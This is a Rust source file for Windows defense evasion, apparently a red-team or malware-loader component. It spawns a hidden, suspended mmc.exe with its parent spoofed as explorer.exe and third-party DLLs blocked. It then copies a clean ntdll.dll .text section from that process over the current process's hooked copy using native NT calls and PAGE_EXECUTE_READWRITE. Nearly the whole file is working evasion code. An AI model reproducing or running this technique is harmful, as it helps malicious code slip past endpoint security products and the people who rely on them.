//#![allow(non_snake_case, dead_code, unused_imports)]
use std::mem::size_of;
use std::ptr::null_mut;
use widestring::U16CString;
use winapi::ctypes::c_void;
use std::ffi::c_int;
use ntapi::{
    ntpsapi::{
        NtQueryInformationProcess, 
        PROCESS_BASIC_INFORMATION, ProcessBasicInformation,
        PS_ATTRIBUTE, PS_CREATE_INFO

    },
    ntrtl::{RtlCreateProcessParametersEx ,RtlDestroyProcessParameters}
};

use winapi::shared::{
    basetsd::{SIZE_T},
    minwindef::{ULONG,DWORD},
    ntdef::{UNICODE_STRING, OBJECT_ATTRIBUTES, NTSTATUS},

};
use winapi::um::{
    winnt::{HANDLE, PROCESS_ALL_ACCESS}
};
use windows_sys::Win32::System::Diagnostics::ToolHelp::Process32First;
use windows_sys::Win32::System::Diagnostics::ToolHelp::PROCESSENTRY32;
use winapi::um::handleapi::INVALID_HANDLE_VALUE;
use windows_sys::Win32::System::Diagnostics::ToolHelp::TH32CS_SNAPPROCESS;
use windows_sys::Win32::System::Diagnostics::ToolHelp::CreateToolhelp32Snapshot;
use windows_sys::Win32::System::Diagnostics::ToolHelp::Process32Next;
use winapi::um::winnt::PAGE_EXECUTE_READWRITE;

use ntapi::{
    ntldr::LDR_DATA_TABLE_ENTRY,
    ntpebteb::PEB,
    ntpsapi::PEB_LDR_DATA,
    winapi::um::winnt::{
        IMAGE_DOS_HEADER, IMAGE_SECTION_HEADER,
    },
};


use ntapi::ntobapi::DUPLICATE_SAME_ACCESS;
use ntapi::ntobapi::NtDuplicateObject;
use winapi::shared::basetsd::PSIZE_T;
use winapi::shared::ntdef::PVOID;
use winapi::shared::minwindef::PULONG;
use winapi::um::winnt::IMAGE_SCN_MEM_READ;
use winapi::um::winnt::IMAGE_SCN_MEM_EXECUTE;
use winapi::um::winnt::IMAGE_NT_HEADERS;
use ntapi::ntobapi::NtClose;
use memoffset::offset_of;
use std::io;
use winapi::shared::ntdef::WCHAR;
use ntapi::ntpsapi::ProcessImageFileName;


extern "system" {
    fn NtCreateUserProcess(
        ProcessHandle: *mut HANDLE,
        ThreadHandle: *mut HANDLE,
        ProcessDesiredAccess: ULONG,
        ThreadDesiredAccess: ULONG,
        ProcessObjectAttributes: *mut OBJECT_ATTRIBUTES,
        ThreadObjectAttributes: *mut OBJECT_ATTRIBUTES,
        ProcessFlags: ULONG,
        ThreadFlags: ULONG,
        ProcessParameters: *mut c_void,
        CreateInfo: *mut PS_CREATE_INFO,
        AttributeList: *mut PS_ATTRIBUTE_LIST,
    ) -> NTSTATUS;
    // Declaration for NtOpenProcess
    fn NtOpenProcess(
        ProcessHandle: *mut HANDLE,
        DesiredAccess: ULONG,
        ObjectAttributes: *mut OBJECT_ATTRIBUTES,
        ClientId: *mut CLIENT_ID
    ) -> NTSTATUS;

    fn NtReadVirtualMemory(
        ProcessHandle: HANDLE,
        BaseAddress: PVOID,
        Buffer: PVOID,
        NumberOfBytesToRead: SIZE_T,
        NumberOfBytesReaded: PSIZE_T,
    ) -> NTSTATUS;

    fn NtWriteVirtualMemory(
        ProcessHandle: HANDLE,
        BaseAddress: PVOID,
        Buffer: PVOID,
        NumberOfBytesToWrite: SIZE_T,
        NumberOfBytesWritten: PSIZE_T,
    ) -> NTSTATUS;

    fn NtProtectVirtualMemory(
        ProcessHandle: HANDLE,
        BaseAddress: *mut PVOID,
        NumberOfBytesToProtect: PSIZE_T,
        NewAccessProtection: ULONG,
        OldAccessProtection: PULONG
    ) -> NTSTATUS;

}

const PS_ATTRIBUTE_MITIGATION_OPTIONS_2: ULONG = 0x20010;
const PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON: u64 = 0x10000000000;

#[repr(C)]
struct CLIENT_ID {
    UniqueProcess: HANDLE,
    UniqueThread: HANDLE,
}

#[repr(C)]
struct PS_ATTRIBUTE_LIST {
    TotalLength: SIZE_T,
    Attributes: [PS_ATTRIBUTE; 3],
}

const STARTF_USESHOWWINDOW: DWORD = 0x00000001;
const SW_HIDE: c_int = 0;



struct Process {
    process_name: String,
    process_id: u32,
    process_handle: isize,

}


fn spawn_process(ppid: u64, process: &mut Process) {
    unsafe {

// C:\\Program Files\\Internet Explorer\\iexplore.exe
// C:\\Windows\\System32\\mmc.exe
// 

        let nt_image_path = U16CString::from_str("\\??\\C:\\Windows\\System32\\mmc.exe").unwrap();
        let current_directory = U16CString::from_str("\\??\\C:\\Windows\\System32").unwrap();
        let command_line = U16CString::from_str("C:\\Windows\\System32\\mmc.exe").unwrap();

        let mut nt_image_path_us = UNICODE_STRING {
            Length: (nt_image_path.len() * 2) as u16,
            MaximumLength: (nt_image_path.len() * 2) as u16,
            Buffer: nt_image_path.into_raw() as *mut _,
        };

        let mut current_directory_us = UNICODE_STRING {
            Length: (current_directory.len() * 2) as u16,
            MaximumLength: (current_directory.len() * 2) as u16,
            Buffer: current_directory.into_raw() as *mut _,
        };

        let mut command_line_us = UNICODE_STRING {
            Length: (command_line.len() * 2) as u16,
            MaximumLength: (command_line.len() * 2) as u16,
            Buffer: command_line.into_raw() as *mut _,
        };

        let mut process_parameters: *mut _ = std::ptr::null_mut();
        RtlCreateProcessParametersEx(
            &mut process_parameters,
            &mut nt_image_path_us as *mut _,
            std::ptr::null_mut(),
            &mut current_directory_us,
            &mut command_line_us,
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            0x01,
        );

        // Uncomment those 2 lines to start the prcoess in "Hidden" State

        (*process_parameters).WindowFlags |= STARTF_USESHOWWINDOW;
        (*process_parameters).ShowWindowFlags = SW_HIDE as u32;

        // Obtain handle to parent (e.g., explorer.exe with PID 10104)
        let mut oa: OBJECT_ATTRIBUTES = std::mem::zeroed();
        let mut cid = CLIENT_ID {
            UniqueProcess: ppid as HANDLE, // Hardcoded PID for explorer.exe
            UniqueThread: null_mut(),
        };
        
        let mut hParent: HANDLE = null_mut();
        NtOpenProcess(&mut hParent, PROCESS_ALL_ACCESS, &mut oa, &mut cid);

        // Adjust the PS_ATTRIBUTE_LIST to hold 3 attributes
        let mut attribute_list: PS_ATTRIBUTE_LIST = std::mem::zeroed();
        attribute_list.TotalLength = size_of::<PS_ATTRIBUTE_LIST>() as _;


        // Initialize the PS_CREATE_INFO structure
        let mut create_info: PS_CREATE_INFO = std::mem::zeroed();
        create_info.Size = size_of::<PS_CREATE_INFO>() as _;

        attribute_list.Attributes[0].Attribute = 0x20005; // PS_ATTRIBUTE_IMAGE_NAME 
        attribute_list.Attributes[0].Size = nt_image_path_us.Length as usize;
        attribute_list.Attributes[0].u.Value = nt_image_path_us.Buffer as usize;


        // Set Parent Process attribute
        attribute_list.Attributes[1].Attribute = 0x00060000;
        attribute_list.Attributes[1].Size = size_of::<HANDLE>();
        attribute_list.Attributes[1].u.ValuePtr = hParent; 

        // BlockDLLs policy
        let policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
        attribute_list.Attributes[2].Attribute = 0x20010 as usize;
        attribute_list.Attributes[2].Size = size_of::<u64>();
        attribute_list.Attributes[2].u.ValuePtr = &policy as *const _ as *mut c_void;

            
        let mut h: HANDLE = null_mut();
        let mut t: HANDLE = null_mut();
        let r2 = NtCreateUserProcess(
                &mut h, 
                &mut t, 
                (0x000F0000) |  (0x00100000) | 0xFFFF, //PROCESS_ALL_ACCESS
                (0x000F0000) |  (0x00100000) | 0xFFFF, //THREAD_ALL_ACCESS
                null_mut(), 
                null_mut(), 
                0x00000001, // 0x00000001 For susspended
                0x1, // 0x1 For susspended
                process_parameters as *mut _, 
                &mut create_info as *mut _, 
                &mut attribute_list as *mut _
        );

        let mut pbi: PROCESS_BASIC_INFORMATION = std::mem::zeroed();
        let status = NtQueryInformationProcess(
                h, 
                ProcessBasicInformation, 
                &mut pbi as *mut _ as *mut c_void,
                std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as ULONG,
                null_mut()
        );

        if status == 0 || r2 == 0 {
            process.process_id = pbi.UniqueProcessId as u32;
            process.process_handle = h as isize;
            let mut return_length: ULONG = 0;
            let mut buffer: [WCHAR; 1024] = [0; 1024];
            let status = NtQueryInformationProcess(
                h,
                ProcessImageFileName,
                &mut buffer as *mut _ as *mut c_void,
                1024 * std::mem::size_of::<WCHAR>() as ULONG,
                &mut return_length
            );

            if status == 0 {
                let len = return_length as usize / std::mem::size_of::<WCHAR>();
                let path = String::from_utf16(&buffer[..len]).expect("Failed to convert WCHAR buffer to String");
                
                if let Some(filename) = path.split('\\').last() {
                    process.process_name = filename.to_owned();
                }
            }

        } else {
            println!("NTSTATUS: {:x}", r2);
            println!("Error querying process info: {:?}", status);
        }
        // 11. Close the handle to the parent process.

        NtClose(hParent as *mut c_void);

        // 12. Free any allocated memory.
        RtlDestroyProcessParameters(process_parameters);
    }

}

/// Gets the process ID by name, take process name as a parameter
fn get_process_id_by_name(process_name: &str) -> Result<u32, String> {
    let h_snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };

    if h_snapshot == INVALID_HANDLE_VALUE as isize {
        return Ok(Err("Failed to call CreateToolhelp32Snapshot").to_owned()?);
    }

    let mut process_entry: PROCESSENTRY32 = unsafe { std::mem::zeroed::<PROCESSENTRY32>() };
    process_entry.dwSize = size_of::<PROCESSENTRY32>() as u32;

    if unsafe { Process32First(h_snapshot, &mut process_entry) } == 0 {
        return Ok(Err("Failed to call Process32First").to_owned()?);
    }

    loop {
        if convert_c_array_to_rust_string(process_entry.szExeFile.to_vec()).to_lowercase()
            == process_name.to_lowercase()
        {
            break;
        }

        if unsafe { Process32Next(h_snapshot, &mut process_entry) } == 0 {
            return Ok(Err("Failed to call Process32Next").to_owned()?);
        }
    }

    return Ok(process_entry.th32ProcessID);
}


fn convert_c_array_to_rust_string(buffer: Vec<u8>) -> String {
    let mut rust_string: Vec<u8> = Vec::new();
    for char in buffer {
        if char == 0 {
            break;
        }
        rust_string.push(char as _);
    }
    String::from_utf8(rust_string).unwrap()
}



fn GetCurrentProcessId() -> Result<u32, String> {
    let pseudo_handle = -1isize as *mut c_void;
    let mut pbi: PROCESS_BASIC_INFORMATION = unsafe { std::mem::zeroed() };
    let status = unsafe {NtQueryInformationProcess(
            pseudo_handle,
            ProcessBasicInformation,
            &mut pbi as *mut _ as *mut c_void,
            std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as ULONG,
            null_mut()
        )
    };
    if status != 0 {
        Err("Failed to query process basic information".to_owned())
    } else {
        Ok(pbi.UniqueProcessId as u32)
    }

}


fn GetCurrentProcessHandle() -> Result<HANDLE, i32> {
    let pseudo_handle = -1isize as HANDLE;
    let mut real_handle: HANDLE = null_mut();

    let status = unsafe {NtDuplicateObject(
            pseudo_handle,
            pseudo_handle,
            pseudo_handle,
            &mut real_handle,
            PROCESS_ALL_ACCESS,
            0,
            DUPLICATE_SAME_ACCESS
        )
    };

    if status == 0 {
        Ok(real_handle)
    } else {
        Err(status)
    }

}

fn get_module_base_by_name(module_name: &str, process_id: u32) -> Result<*mut u8, String> {
    let process_handle = get_process_handle(process_id)?;
    let _object_attributes: OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed::<OBJECT_ATTRIBUTES>() };
    let mut client_id: CLIENT_ID = unsafe { std::mem::zeroed::<CLIENT_ID>() };
    client_id.UniqueProcess = process_id as PVOID;

    let mut process_basic_info: PROCESS_BASIC_INFORMATION = unsafe { std::mem::zeroed::<PROCESS_BASIC_INFORMATION>() };
    let mut return_length: ULONG = 0;
    let status = unsafe {NtQueryInformationProcess(
            process_handle as *mut c_void,
            ProcessBasicInformation,
            &mut process_basic_info as *mut PROCESS_BASIC_INFORMATION as *mut c_void,
            size_of::<PROCESS_BASIC_INFORMATION>() as ULONG,
            &mut return_length
        )
    };

    if status != 0 {
        return Err("Failed to call NtQueryInformationProcess".to_owned());
    }

    let pbi = process_basic_info.PebBaseAddress;
    let mut peb: PEB = unsafe { std::mem::zeroed::<PEB>() };
    let status = unsafe {NtReadVirtualMemory(
            process_handle as *mut c_void,
            pbi as PVOID,
            &mut peb as *mut PEB as *mut c_void,
            size_of::<PEB>() as SIZE_T,
            null_mut()
        )
    };

    if status != 0 {
        return Err("Failed to read PEB".to_owned());
    }

    let mut ldr_data: PEB_LDR_DATA = unsafe { std::mem::zeroed::<PEB_LDR_DATA>() };
    let status = unsafe {NtReadVirtualMemory(
            process_handle as *mut c_void,
            peb.Ldr as PVOID,
            &mut ldr_data as *mut PEB_LDR_DATA as *mut c_void,
            size_of::<PEB_LDR_DATA>() as SIZE_T,
            null_mut()
        )
    };

    if status != 0 {
        return Err("Failed to read PEB_LDR_DATA".to_owned());
    }

    let mut ldr_entry: LDR_DATA_TABLE_ENTRY = unsafe { std::mem::zeroed::<LDR_DATA_TABLE_ENTRY>() };
    let mut current = ldr_data.InLoadOrderModuleList.Flink;

    loop {
        let ldr_entry_address = (current as usize - offset_of!(LDR_DATA_TABLE_ENTRY, InLoadOrderLinks)) as *mut LDR_DATA_TABLE_ENTRY;
        let status = unsafe {NtReadVirtualMemory(
                process_handle as *mut c_void,
                ldr_entry_address as PVOID,
                &mut ldr_entry as *mut LDR_DATA_TABLE_ENTRY as *mut c_void,
                size_of::<LDR_DATA_TABLE_ENTRY>() as SIZE_T,
                null_mut()
            )
        };

        if status != 0 {
            return Err("Failed to read LDR_DATA_TABLE_ENTRY".to_owned());
        }

        let module_name_length = ldr_entry.BaseDllName.Length as usize;
        let mut module_name_vec = vec![0u16; module_name_length / 2];
        let status = unsafe {NtReadVirtualMemory(
                process_handle as *mut c_void,
                ldr_entry.BaseDllName.Buffer as PVOID,
                module_name_vec.as_mut_ptr() as *mut c_void,
                module_name_length as SIZE_T,
                null_mut()
            )
        };

        if status != 0 {
            return Err("Failed to read module name".to_owned());
        }

        let current_module_name = String::from_utf16_lossy(&module_name_vec);
        if current_module_name.to_lowercase() == module_name.to_lowercase() {
            unsafe { NtClose(process_handle as *mut c_void)};
            return Ok(ldr_entry.DllBase as *mut u8);
        }

        if current == ldr_data.InLoadOrderModuleList.Blink {
            break;
        }

        current = ldr_entry.InLoadOrderLinks.Flink;
    }

    unsafe { NtClose(process_handle as *mut c_void)};
    Err("Failed to find module".to_owned())

}


fn find_rx_section_offset(process: &mut Process, module_base: usize) -> io::Result<u32> {
    let dos_header: IMAGE_DOS_HEADER = read_memory(process.process_handle as *mut c_void, module_base).expect("Failed to read DOS header");
    let nt_headers: IMAGE_NT_HEADERS = read_memory(process.process_handle as *mut c_void, module_base + dos_header.e_lfanew as usize).expect("Failed to read NT headers");

    for i in 0..nt_headers.FileHeader.NumberOfSections {
        let section_header: IMAGE_SECTION_HEADER = read_memory::<IMAGE_SECTION_HEADER>(
            process.process_handle as *mut c_void,
            module_base + dos_header.e_lfanew as usize + std::mem::size_of::<IMAGE_NT_HEADERS>()  + (i as usize) * std::mem::size_of::<IMAGE_SECTION_HEADER>(),
        )
        .expect("Failed to read section header");

        if (section_header.Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0
            && (section_header.Characteristics & IMAGE_SCN_MEM_READ) != 0
        {
            
            return Ok(section_header.VirtualAddress);
        }
    }

    
    Ok(0)

}


fn find_rx_section_size(process: &mut Process, module_base: usize) -> io::Result<u32> {
    let dos_header: IMAGE_DOS_HEADER = read_memory(process.process_handle as *mut c_void, module_base).expect("Failed to read DOS header");
    let nt_headers: IMAGE_NT_HEADERS = read_memory(process.process_handle as *mut c_void, module_base + dos_header.e_lfanew as usize).expect("Failed to read NT headers");

    for i in 0..nt_headers.FileHeader.NumberOfSections {
        let section_header: IMAGE_SECTION_HEADER = read_memory(
            process.process_handle as *mut c_void,
            module_base + dos_header.e_lfanew as usize + std::mem::size_of::<IMAGE_NT_HEADERS>()  + (i as usize) * std::mem::size_of::<IMAGE_SECTION_HEADER>(),
        )
        .expect("Failed to read section header");

        if (section_header.Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0
            && (section_header.Characteristics & IMAGE_SCN_MEM_READ) != 0
        {
            
            return Ok(section_header.SizeOfRawData);
        }
    }

    
    Ok(0)

}


fn get_process_handle(process_id: u32) -> Result<isize, String> {
    let mut object_attrs: OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
    let mut client_id: CLIENT_ID = unsafe { std::mem::zeroed() };
    let mut handle: HANDLE = null_mut();

    client_id.UniqueProcess = process_id as *mut c_void;

    let status = unsafe {NtOpenProcess(
            &mut handle,
            PROCESS_ALL_ACCESS,
            &mut object_attrs,
            &mut client_id
        )
    };

    if status != 0 {
        panic!("{}", ("[-] Error: failed to open process"));
    }

    Ok(handle as isize)

}


fn read_memory<T>(process_handle: *mut c_void, address: usize) -> Result<T, String> {
    let mut buffer: T = unsafe { std::mem::zeroed() };
    let buffer_size = std::mem::size_of::<T>();

    let status = unsafe {NtReadVirtualMemory(
            process_handle as *mut c_void,
            address as PVOID,
            &mut buffer as *mut T as *mut c_void,
            buffer_size as SIZE_T,
            null_mut()
        )
    };

    if status != 0 {

        panic!("{} {:p} {} {:#X}", "Failed to read memory at address",  address as *const u8, "with NTSTATUS:", status);
    }

    Ok(buffer)

}

fn Unhook_ntdll(remote_process: &mut Process) {
    println!("[+] Unhooking ntdll from current process...");

    // Get the current process ID
    let current_process_id = GetCurrentProcessId().unwrap_or_else(|err| panic!("{}", err));

    // Get a handle to the current process
    let current_process_handle = GetCurrentProcessHandle().unwrap_or_else(|err| {
        println!("Error getting current process handle: {}", err);
        panic!("{}", err);
    });

    // Get the base address of ntdll.dll for the remote suspended process
    let remote_ntdll_base = get_module_base_by_name("ntdll.dll", current_process_id).unwrap_or_else(|err| panic!("{}", err));

    // Find the .text section of ntdll in the remote process
    let text_section_offset = find_rx_section_offset(remote_process, remote_ntdll_base as usize).expect("Failed to find rx section offset");
    let text_section_size = find_rx_section_size(remote_process, remote_ntdll_base as usize).expect("Failed to get rx section size");


    // Read the pristine .text section from the remote process
    let mut buffer: Vec<u8> = vec![0; text_section_size as usize];
    let mut bytes_read: SIZE_T = 0;
    let status = unsafe {NtReadVirtualMemory(
            remote_process.process_handle as *mut c_void,
            (remote_ntdll_base as usize + text_section_offset as usize) as *mut c_void,
            buffer.as_mut_ptr() as *mut c_void,
            text_section_size as SIZE_T,
            &mut bytes_read
        )
    };

    if status != 0 || bytes_read != text_section_size as SIZE_T {
        println!("Failed to read memory from remote process. Status: {}, Bytes Read: {}", status, bytes_read);
        panic!("{}", "Failed to read the .text section of ntdll.dll from the remote process");
    }

    // Overwrite the .text section of ntdll in the current process with the pristine copy
    let current_ntdll_base = get_module_base_by_name("ntdll.dll", current_process_id).unwrap_or_else(|err| panic!("{}", err));
    let mut base_address = (current_ntdll_base as usize + text_section_offset as usize) as *mut c_void;
    let mut size_to_protect = text_section_size as SIZE_T;
    let mut old_protect: DWORD = 0;
    
    // Change protection of the target area to PAGE_READWRITE
    let protect_status = unsafe {NtProtectVirtualMemory(
            current_process_handle,
            &mut base_address, // Pointer to the base address
            &mut size_to_protect, // Pointer to the size
            PAGE_EXECUTE_READWRITE,
            &mut old_protect)
    };

    if protect_status != 0 {
        println!("Failed to change memory protection. Status: {:#X}", protect_status);
        panic!("{}", "Failed to change the memory protection to PAGE_READWRITE");
    }

    let mut bytes_written: SIZE_T = 0;
    let write_status = unsafe {NtWriteVirtualMemory(
            current_process_handle,
            base_address,
            buffer.as_ptr() as *mut c_void,
            text_section_size as SIZE_T,
            &mut bytes_written)
    };

    if write_status != 0 || bytes_written != text_section_size as SIZE_T {
        println!("Failed to write memory to current process. Status: {:#X}, Bytes Written: {}", write_status, bytes_written);
        panic!("{}", "Failed to overwrite the .text section of ntdll.dll in the current process");
    }

    // Restore original protection
    let restore_status = unsafe {NtProtectVirtualMemory(
            current_process_handle,
            &mut base_address, // Pointer to the base address
            &mut size_to_protect, // Pointer to the size
            old_protect,
            &mut old_protect
        )
    };

    if restore_status != 0 {
        println!("Failed to restore memory protection. Status: {:#X}", restore_status);
        panic!("{}", "Failed to restore the original memory protection");
    }

    println!("[+] Unhooking completed successfully.");
    //unsafe { NtResumeThread(remote_process.thread_handle)};
    


}

fn main() {

    let process = "explorer.exe";
    let ppid = get_process_id_by_name(&process).expect("Failed to get process ID");
    let mut process = Process {
        process_name: String::new(),  // placeholder
        process_id: 0, 
        process_handle: 0,
        
    };
    // Step 2: Spawn the iexplore.exe process and initialize the Process struct.
    spawn_process(ppid as u64, &mut process);

    println!("{} {} {} {}", "[+] Successfully Spwand Process", process.process_name, "With PID:", process.process_id);

    std::thread::sleep(std::time::Duration::from_secs(3));
    Unhook_ntdll(&mut process);



}




